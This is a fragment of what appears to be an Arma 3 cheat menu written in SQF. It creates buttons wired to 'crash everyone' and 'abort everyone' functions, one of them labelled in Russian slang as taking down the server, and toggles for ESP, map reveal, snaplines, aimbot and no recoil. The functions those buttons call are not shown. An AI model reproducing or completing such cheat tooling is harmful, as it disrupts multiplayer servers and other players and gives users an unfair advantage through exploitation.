	_btn_crash_terpil ctrlAddEventHandler ["ButtonClick", "[] spawn test_crash_everyone"];


	_btn_crash_server = _display ctrlCreate ["RscButton", 1603];
	_btn_crash_server ctrlSetText "Положить помойку";
	_btn_crash_server ctrlSetPosition [0.15 * safezoneW + safezoneX, 0.33 * safezoneH + safezoneY, 0.075 * safezoneW, 0.02 * safezoneH];
	_btn_crash_server ctrlSetFont "EtelkaMonospacePro";
	_btn_crash_server ctrlSetFontHeight 0.025;
	_btn_crash_server ctrlSetActiveColor [0.210, 0.40, 0.128, 1];
	_btn_crash_server ctrlCommit 0;
	_btn_crash_server ctrlAddEventHandler ["ButtonClick", "[] spawn test_abort_everyone"];
};

test_page_1 = {
	_display = findDisplay 46 createDisplay "RscDisplayEmpty";

	[_display] call test_main;

	[_display] call testchbox1; [CheckBox1Str, "Esp", [0.0375 * safezoneW + safezoneX, 0.16 * safezoneH + safezoneY, 0.0875 * safezoneW, 0.02 * safezoneH], 0.05, _display, [1,1,1,1]] call drawString;
	[_display] call testchbox5; [CheckBox2Str, "Map", [0.0375 * safezoneW + safezoneX, 0.2 * safezoneH + safezoneY, 0.0875 * safezoneW, 0.02 * safezoneH], 0.05, _display, [1,1,1,1]] call drawString;
	[_display] call testchbox4; [CheckBox3Str, "Esp car", [0.0375 * safezoneW + safezoneX, 0.24 * safezoneH + safezoneY, 0.0875 * safezoneW, 0.02 * safezoneH], 0.05, _display, [1,1,1,1]] call drawString;
	[_display] call testchbox7; [CheckBox4Str, "Snapline", [0.0375 * safezoneW + safezoneX, 0.28 * safezoneH + safezoneY, 0.0875 * safezoneW, 0.02 * safezoneH], 0.05, _display, [1,1,1,1]] call drawString;
	[_display] call testchbox6; [CheckBox5Str, "Bullet", [0.0375 * safezoneW + safezoneX, 0.32 * safezoneH + safezoneY, 0.0875 * safezoneW, 0.02 * safezoneH], 0.05, _display, [1,1,1,1]] call drawString;

	[_display] call testchbox8; [CheckBox8Str, "Aim", [0.15 * safezoneW + safezoneX, 0.16 * safezoneH + safezoneY, 0.0875 * safezoneW, 0.02 * safezoneH], 0.05, _display, [1,1,1,1]] call drawString;
	[_display] call testchbox11; [CheckBox9Str, "No recoil", [0.15 * safezoneW + safezoneX, 0.2 * safezoneH + safezoneY, 0.0875 * safezoneW, 0.02 * safezoneH], 0.05, _display, [1,1,1,1]] call drawString;

};